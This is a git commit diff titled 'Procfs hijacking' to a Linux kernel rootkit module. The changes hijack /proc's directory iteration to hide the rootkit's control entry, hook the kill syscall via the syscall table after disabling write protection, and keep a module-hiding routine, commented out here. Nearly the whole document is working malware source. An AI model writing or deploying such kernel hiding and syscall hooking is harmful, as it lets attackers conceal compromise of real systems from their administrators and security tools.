a8b0912abec118936cccbd2adcdae43d5ca3e481
Fergus Longley <ferguslongley@gmail.com>
2020-11-26 14:51:48 +0000

    Procfs hijacking

--- rootkit.c
+++ rootkit.c
@@ -5,6 +5,9 @@
 #include <linux/syscalls.h>
 #include <linux/random.h>
 #include <linux/proc_fs.h>
+#include <linux/namei.h>
+
+#include "rootkit.h"
 
 // Static variables
 
@@ -13,6 +16,19 @@ static u8 module_hidden = 0;
 static struct list_head *module_list;
 
 static struct proc_dir_entry *proc_rootkit;
+
+// Vars for proc manipulation
+static struct inode *proc_inode;
+static const struct file_operations *orig_proc_fops;
+static struct file_operations hacked_proc_fops;
+struct dir_context *backup_ctx;
+
+// Vars for syscall hijacking
+static unsigned long *syscall_table;
+
+static struct path proc_path;
+typedef asmlinkage long (*sys_call_ptr_t)(const struct pt_regs *);
+static sys_call_ptr_t original_kill;
 
 // Module hiding
 
@@ -54,15 +70,10 @@ static inline void enable_write_protect(void)
     force_write_cr0(cr0);
 }
 
-static unsigned long *syscall_table;
-
 unsigned long *find_syscall_table(void)
 {
     return (unsigned long *)kallsyms_lookup_name("sys_call_table");
 }
-
-typedef asmlinkage long (*sys_call_ptr_t)(const struct pt_regs *);
-static sys_call_ptr_t original_kill;
 
 asmlinkage long hacked_kill(const struct pt_regs *pt_regs)
 {
@@ -98,6 +109,28 @@ static ssize_t rk_proc_write(struct file *file, const char __user *ubuf, size_t 
     return -1;
 }
 
+static int rk_filldir_t(struct dir_context *ctx, const char *proc_name, int len,
+                        loff_t off, u64 ino, unsigned int d_type)
+{
+    if (strncmp(proc_name, PROCFILE_NAME, strlen(PROCFILE_NAME) - 1) == 0)
+        return 0;
+    return backup_ctx->actor(backup_ctx, proc_name, len, off, ino, d_type);
+}
+
+struct dir_context rk_ctx = {
+    .actor = rk_filldir_t,
+};
+
+int rk_iterate_shared(struct file *file, struct dir_context *ctx)
+{
+    int result = 0;
+    rk_ctx.pos = ctx->pos;
+    backup_ctx = ctx;
+    result = orig_proc_fops->iterate_shared(file, &rk_ctx);
+    ctx->pos = rk_ctx.pos;
+    return result;
+}
+
 static const struct file_operations proc_rootkit_fops = {
     .read = rk_proc_read,
     .write = rk_proc_write,
@@ -105,9 +138,23 @@ static const struct file_operations proc_rootkit_fops = {
 
 static int proc_init(void)
 {
-    proc_rootkit = proc_create("rootkit", S_IRUGO | S_IWUSR, NULL, &proc_rootkit_fops);
+    // Create entry for controlling rootkit
+    proc_rootkit = proc_create(PROCFILE_NAME, S_IRUGO | S_IWUSR, NULL, &proc_rootkit_fops);
     if (!proc_rootkit)
         return -1;
+
+    if (kern_path("/proc", 0, &proc_path))
+        return -1;
+    // Get inode of proc
+    proc_inode = proc_path.dentry->d_inode;
+    // Make copy of file ops and backup orig
+    hacked_proc_fops = *proc_inode->i_fop;
+    orig_proc_fops = proc_inode->i_fop;
+    // Modify iterate_shared
+    hacked_proc_fops.iterate_shared = rk_iterate_shared;
+    // Change fops to hacked
+    proc_inode->i_fop = &hacked_proc_fops;
+
     return 0;
 }
 
@@ -118,6 +165,11 @@ static void proc_clean(void)
         proc_remove(proc_rootkit);
         proc_rootkit = NULL;
     }
+
+    if (kern_path("/proc", 0, &proc_path))
+        return;
+    proc_inode = proc_path.dentry->d_inode;
+    proc_inode->i_fop = orig_proc_fops;
 }
 
 static int __init lkm_rootkit_init(void)
@@ -130,7 +182,7 @@ static int __init lkm_rootkit_init(void)
         return 1;
     }
 
-    module_hide();
+    // module_hide();
 
     syscall_table = find_syscall_table();
     pr_info("Found syscall_table at %lx\n", *syscall_table);
---
+++ rootkit.h
@@ -0,0 +1,1 @@
+#define PROCFILE_NAME "rootkit"
